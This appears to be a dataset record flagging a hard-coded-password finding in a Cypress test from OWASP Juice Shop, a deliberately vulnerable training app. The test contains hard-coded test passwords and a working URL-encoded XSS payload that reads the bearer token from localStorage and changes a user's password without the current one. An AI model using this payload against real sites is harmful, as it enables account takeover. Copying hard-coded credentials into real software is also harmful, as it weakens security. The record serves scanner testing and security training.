@@ -1,0 +1,18 @@
+{
+  "case_id": "SONARQUBE-025",
+  "scanner": "SonarQube",
+  "rule_id": "typescript:S2068",
+  "rule_name": "Review this potentially hard-coded password.",
+  "rule_description": "Review this potentially hard-coded password.",
+  "language": "typescript",
+  "file": "app.ts",
+  "line": 6,
+  "vulnerable_code": "describe('/#/privacy-security/change-password', () => {\n  describe('as Morty', () => {\n    beforeEach(() => {\n      cy.login({\n        email: 'morty',\n        password: 'focusOnScienceMorty!focusOnScience'\n      })\n      cy.visit('/#/privacy-security/change-password')\n    })\n\n    it('should be able to change password', () => {\n      cy.get('#currentPassword').focus().type('focusOnScienceMorty!focusOnScience')\n      cy.get('#newPassword').focus().type('GonorrheaCantSeeUs!')\n      cy.get('#newPasswordRepeat').focus().type('GonorrheaCantSeeUs!')\n      cy.get('#changeButton').click()\n\n      cy.get('.confirmation').should('not.be.hidden')\n    })\n  })\n\n  describe('challenge \"changePasswordBenderChallenge\"', () => {\n    it('should be able to change password via XSS-powered attack on password change without passing current password', () => {\n      cy.login({\n        email: 'bender',\n        password: 'OhG0dPlease1nsertLiquor!'\n      })\n      cy.visit(\n        '/#/search?q=%3Ciframe%20src%3D%22javascript%3Axmlhttp%20%3D%20new%20XMLHttpRequest%28%29%3B%20xmlhttp.open%28%27GET%27%2C%20%27http%3A%2F%2Flocalhost%3A3000%2Frest%2Fuser%2Fchange-password%3Fnew%3DslurmCl4ssic%26amp%3Brepeat%3DslurmCl4ssic%27%29%3B%20xmlhttp.setRequestHeader%28%27Authorization%27%2C%60Bearer%3D%24%7BlocalStorage.getItem%28%27token%27%29%7D%60%29%3B%20xmlhttp.send%28%29%3B%22%3E'\n      )\n      cy.wait(2000)\n      cy.login({ email: 'bender', password: 'slurmCl4ssic' })\n      cy.url().should('match', /\\/search/)\n\n      cy.expectChallengeSolved({ challenge: \"Change Bender's Password\" })\n    })\n  })\n})\n",
+  "source": {
+    "corpus": "juice-shop",
+    "url": "https://github.com/juice-shop/juice-shop",
+    "commit": "c9f99228d9d56afb5f5ca7925376292f7fa44b13",
+    "path": "test/cypress/e2e/changePassword.spec.ts",
+    "license": "MIT"
+  }
+}
